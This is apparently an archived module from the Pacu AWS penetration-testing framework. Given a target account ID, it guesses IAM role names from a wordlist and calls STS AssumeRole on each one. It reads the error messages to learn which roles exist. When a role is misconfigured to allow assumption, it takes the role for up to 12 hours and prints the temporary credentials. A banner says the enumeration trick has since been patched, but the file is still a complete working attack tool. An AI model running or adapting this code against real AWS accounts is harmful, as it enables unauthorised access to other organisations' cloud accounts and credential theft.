####################################################################
#                                                                  #
#                         MODULE ARCHIVED                          #
#                                                                  #
#   Reason: AWS implemented changes to the STS AssumeRole API so   #
#       that it no longer returns different verbose error messages #
#       depending on whether a role exists or not, so this method  #
#       of enumeration has been patched. For a new method that     #
#       does the exact same thing, look at the iam__enum_roles     #
#       module.                                                    #
#                                                                  #
####################################################################

#!/usr/bin/env python3
import argparse
import botocore
import random
import string


module_info = {
    'name': 'iam__enum_assume_role',

    'author': 'Spencer Gietzen of Rhino Security Labs',

    'category': 'RECON_UNAUTH',

    'one_liner': 'Enumerates existing roles in other AWS accounts to try and gain access via misconfigurations.',

    'description': 'This module takes in an AWS account ID and tries to enumerate role names within that account. If one is discovered and it is misconfigured to allow role-assumption from a wide group, it is possible to assume that role and gain access to that AWS account through this method. NOTE: This module is listed under the recon_enum_no_keys category because it is not recommended to use compromised keys to run this module. This module DOES require a set of AWS keys, but it will spam CloudTrail with "AssumeRole" logs, so it is suggested to use a personal account to run this. The keys you use should have the sts:AssumeRole permission on any resource ("*") to identify/assume misconfigured roles, but you will still be able to enumerate roles that exist without it.',

    'services': ['STS'],

    'prerequisite_modules': [],

    'external_dependencies': [],

    'arguments_to_autocomplete': ['--account-id', '--word-list']
}

parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])

parser.add_argument('--account-id', required=True, help='The AWS account ID of the target account (12 numeric characters).')
parser.add_argument('--word-list', required=False, default=None, help='File path to a different word list to use. There is a default word list with 1100+ words and it is stored in this module\'s folder. The word list should contain words, one on each line, to use to try and guess IAM role names. Role names ARE case-sensitive.')


def main(args, pacu_main):
    args = parser.parse_args(args)
    print = pacu_main.print

    if not len(args.account_id) == 12 or not args.account_id.isdigit():
        print('Error: An AWS account ID is a number of length 12. You supplied: {}\n'.format(args.account_id))
        return None

    data = {
        'attempts': 0,
        'enumerated': [],
        'success': False
    }

    print('Targeting account ID: {}\n'.format(args.account_id))

    if args.word_list is None:
        word_list_path = './modules/{}/default-word-list.txt'.format(module_info['name'])
    else:
        word_list_path = args.word_list.strip()

    with open(word_list_path, 'r') as f:
        word_list = f.read().splitlines()

    print('Starting role enumeration...\n')

    client = pacu_main.get_boto3_client('sts')
    for word in word_list:
        role_arn = 'arn:aws:iam::{}:role/{}'.format(args.account_id, word)

        data['attempts'] += 1

        try:
            response = client.assume_role(
                RoleArn=role_arn,
                RoleSessionName=''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits) for _ in range(20)),
                DurationSeconds=43200
            )

            print('Successfully assumed role for 12 hours: {}\n'.format(role_arn))

            data['success'] = True
            data['role_arn'] = role_arn
            response.pop('ResponseMetadata', None)
            print(response)

            break
        except botocore.exceptions.ClientError as error:
            if 'The requested DurationSeconds exceeds the MaxSessionDuration set for this role.' in str(error):
                # Found a vulnerable role, but requested more time than the max allowed for it
                print('** Found vulnerable role: {} **'.format(role_arn))
                print('  Hit max session time limit, reverting to minimum of 1 hour...\n')

                response = client.assume_role(
                    RoleArn=role_arn,
                    RoleSessionName=''.join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits) for _ in range(20)),
                    DurationSeconds=3600
                )

                print('Successfully assumed role: {}\n'.format(role_arn))

                data['success'] = True
                data['role_arn'] = role_arn
                response.pop('ResponseMetadata', None)
                print(response)

                break
            elif 'Not authorized to perform sts:AssumeRole' in str(error):
                # Role not found
                pass
            elif 'is not authorized to perform: sts:AssumeRole on resource' in str(error):
                # Role found, but not allowed to assume
                print('Found restricted role: {}\n'.format(role_arn))
                data['enumerated'].append(role_arn)

    return data


def summary(data, pacu_main):
    if 'success' in data.keys() and data['success'] is True:
        return 'Successfully found a role we can assume after {} guesses: {}\nEnumerated {} restricted role(s): {}'.format(data['attempts'], data['role_arn'], len(data['enumerated']), data['enumerated'])
    else:
        return 'Did not find a role to assume after {} guesses.\nEnumerated {} restricted role(s): {}'.format(data['attempts'], len(data['enumerated']), data['enumerated'])
